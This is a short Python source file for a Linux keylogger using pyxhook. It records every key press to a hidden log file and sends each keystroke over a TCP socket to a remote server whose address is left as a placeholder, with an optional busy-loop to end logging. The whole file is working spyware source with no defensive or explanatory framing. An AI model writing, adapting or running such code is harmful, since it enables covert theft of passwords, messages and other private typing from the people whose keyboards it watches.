import logging
import random
import pyxhook as pyx # Allows for working on linux
import socket

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);

# Connect to the server
# Enter SERVER IP
clientSocket.connect(("[SERVER IP]",9999));

# Create hidden log file
logging.basicConfig(filename=".keylog.log", level=logging.INFO)

def key_press(event):
	# When a key is pressed log it
    with open('.keylog.log', 'a') as f:
        f.write('{}\n'.format(event.Key))
    
    # Send the data to the server
    data = event.Key
    clientSocket.send(data.encode())
    clientSocket.send(b"\n")

# Waste time instead of sleep
def calculator():
	ans = 0
	while ans <= 98324792349:
		ans += random.randint(0, 45)
	keylogger_hook.cancel()


# input hooks
# Required for getting keyboard input
keylogger_hook = pyx.HookManager()
keylogger_hook.KeyDown = key_press

# Stored letters a-z and special characters
# also containts shift keys, return (enter), and more
keylogger_hook.HookKeyboard()

try:
	keylogger_hook.start()
	# calculator() # uncomment out this line for auto termination
except KeyboardInterrupt:
	pass
